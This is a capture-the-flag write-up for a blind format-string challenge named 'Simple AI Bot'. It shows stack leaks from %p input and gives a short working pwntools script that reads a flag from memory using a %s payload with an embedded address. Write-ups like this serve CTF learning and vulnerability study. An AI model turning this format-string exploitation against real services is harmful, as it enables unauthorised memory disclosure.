# Simple AI Bot

Blind pwn suggested by @Rosayxy.

The input string goes through `printf(str)`:

```
Hi, what can I help you with today?
> %p%p%p%p%p%p%p%p
I'm sorry, I don't know about: 0x7fffb71d52f00x110xc00200000x7fffb71d5320(nil)0x70257025702570250x70257025702570250x373265313464000a

Is there anything what you want me to ask?
```

The data printed:

- Don't care:
    - 0x7fffb71d52f0
    - 0x11
    - 0xc0020000
    - 0x7fffb71d5320
    - (nil)
- Location of our `%p%p%p%p%p%p%p%p`:
    - 0x7025702570257025: 4x %p
    - 0x7025702570257025: 4x %p
    - 0x373265313464000a: data after 8x %p

Get flag address:

```
Hi, what can I help you with today?
> flag
The flag is safely stored in 0x57278f8c5040

Is there anything what you want me to ask?
>
```

Put flag address at the end of the input string, and use `%s` to print the contents:

```python
from pwn import *
context(log_level='debug')

p = remote("simple-ai-bot.ctf.zone", 4242)

p.recvuntil(">")
p.sendline(b"flag")
addr = int(p.recvuntil(">").split()[6], 16)
p.sendline(b"%p"*7+b"%s"+p64(addr))
p.interactive()
```

The order of args:

- %p prints arg 1: Don't care
- %p prints arg 2: Don't care
- %p prints arg 3: Don't care
- %p prints arg 4: Don't care
- %p prints arg 5: Don't care
- %p prints arg 6: %p%p%p%p
- %p prints arg 7: %p%p%p%s
- %s prints arg 8: the flag address is here

Solved!
